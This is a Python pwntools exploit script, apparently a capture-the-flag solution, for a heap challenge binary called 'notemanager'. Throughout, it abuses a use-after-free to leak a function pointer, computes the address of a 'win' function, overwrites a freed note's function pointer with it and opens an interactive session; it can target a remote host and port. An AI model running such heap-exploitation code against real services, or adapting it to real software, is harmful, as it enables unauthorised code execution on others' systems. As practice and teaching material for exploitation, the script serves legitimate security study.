#!/usr/bin/env python3

import os
import sys

from pwn import *
 
e = ELF("./notemanager")

context.binary = e
#context.terminal = ["/usr/bin/urxvt", "-e", "/usr/bin/zsh", "-c"]
context.log_level = "info"


def start():
    argv = sys.argv[1:]

    # Accept `debug` as well as pwntools' conventional `GDB` argument.
    if args.GDB or (argv and argv[0].lower() in ("debug", "gdb")):
        if os.environ.get("TMUX"):
            context.terminal = ["tmux", "split-window", "-h"]
        p = process(e.path)
        gdb.attach(p,'source ./babyheap_gdb.py')
        return p

    if not argv or argv[0].lower() == "local":
        return process(e.path)

    if argv[0].lower() == "remote":
        argv = argv[1:]

    if len(argv) == 2:
        host, port = argv
    elif len(argv) == 1 and ":" in argv[0]:
        host, port = argv[0].rsplit(":", 1)
    else:
        log.error(
            f"usage: {sys.argv[0]} [local|debug|gdb|GDB|remote HOST PORT|HOST:PORT]"
        )

    return remote(host, int(port))


p = start()


def as_bytes(value):
    return value if isinstance(value, bytes) else str(value).encode()


def sla(delim, data):
    p.sendlineafter(as_bytes(delim), as_bytes(data))



def new_note(title, l, text):
    sla(b'>', b'1')
    sla(b'Note title:', title)
    sla(b'Note length:', l)
    sla(b'Note text:', text)
    return

def show_note(idx):
    sla(b'>', b'2')
    sla(b'Note to display: ', idx)
    return

def toggle_note(idx):
    sla(b'>', b'3')
    sla(b'Note to toggle: ', idx)
    return

def delete_note(idx):
    sla(b'>', b'4')
    sla(b'Note to delete: ', idx)
    return




NOTE_SIZE = 24

new_note('A', 256, 'A' * 256)
new_note('B', 256, 'B' * 256)
new_note('C', 256, 'C' * 256)

delete_note(0)
delete_note(1)

new_note('D', 24, 'D' * 24)

toggle_note(1)
show_note(3)

p.recvuntil(b'D' * 16)
leak = u64(p.recvn(6).ljust(8, b'\x00'))
log.info(f"leaked print_note_title: {leak:#x}")

# The dangling note is toggled immediately before the leak, so the function
# pointer written into the reclaimed text buffer is print_note_title.  Derive
# win from the ELF symbols instead of relying on a stale hard-coded delta.
win = leak + (e.sym.win - e.sym.print_note_title)
log.info(f"resolved win: {win:#x}")


new_note('A', 256, 'A' * 256)
new_note('B', 256, 'B' * 256)
new_note('C', 256, 'C' * 256)

delete_note(4)
delete_note(5)

new_note('win', 24, b'W' * 16 + p64(win))
show_note(5)



p.interactive()
